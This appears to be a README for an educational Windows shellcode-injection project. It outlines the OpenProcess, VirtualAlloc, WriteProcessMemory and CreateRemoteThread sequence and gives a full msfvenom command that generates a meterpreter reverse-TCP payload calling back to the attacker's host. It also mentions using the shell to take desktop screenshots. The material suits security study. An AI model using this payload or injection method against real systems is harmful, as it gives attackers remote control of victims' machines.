# ShellCodeInjectionWin10
Simple shell injection using [win32 API](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list). Using Windows API functions to inject a shell code for educational purposes.

## Getting Started
This guide walks through the steps required to inject shellcode into a Windows process.

### 1. Attaching to a Process
You need to attach tag onto an existing process or create a new one. This step involves opening a handle to a process using the Windows [`OpenProcess()`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function. 

### 2. Allocating Memory
Allocate enough memory within the target process to fit your shellcode. This can be achieved with the [`VirtualAlloc()`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function.

### 3. Injecting Shellcode
Now write your shellcode into the target process's memory space that you just allocated. This is done using the [`WriteProcessMemory()`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function.

### 4. Executing Shellcode
Lastle is to execute the shellcode you injects. Create a new thread within the target process that points to your shellcode and deliver your payload with the [`CreateRemoteThread()`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) function.

## Shellcode Generation
The reverse shellcode I used was generated using Metasploit's `msfvenom` tool with the following command:

```
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST={Your IP Address} LPORT={Your Port} EXITFUNC=thread -f c --var-name=shellCode
```
Each parameter in the command is explained below:

- '--platform windows' specifies the target platform.
- '--arch x64' sets the architecture to 64 bit.
- '-p windows/x64/meterpreter/reverse_tcp' telling which payload to use. In this case it is a reverse TCP meterpreter shell.
- 'LHOST' and 'LPORT' are placeholders for your IP address and chosen port, directing the reverse shell's connection back to you.
- 'EXITFUNC=thread' ensures the payload exits cleanly by terminating the thread.
- '-f c' outputs the payload in C format.
- '--var-name=shellCode' names the variable holding the shellcode as shellCode.

## Practical Applications
Running this script against the selected process executes the shellcode within a new thread, activating that reverse shell we put in. Through this reverse shell you can run whatever you please, like using the `screenshot` command for real time pictures of the desktop.

## Warning
- This script is purely for educational and research purposes, no unethical use what so ever.
- It will not execute on a standard Windows system without modifications to the Windows Defender for the shellcode signature will be instantly detected and stopped.
- Also be sure to check that your compiler is running the same bit as the process you are taking on. For example, I had error 5 (ACCESS DENIED), for some time due to the fact my compiler was running 32 Bit and not 64 bit, which is what the process application was running. Just be sure that both are matching, otherwise they will not compile error-free.
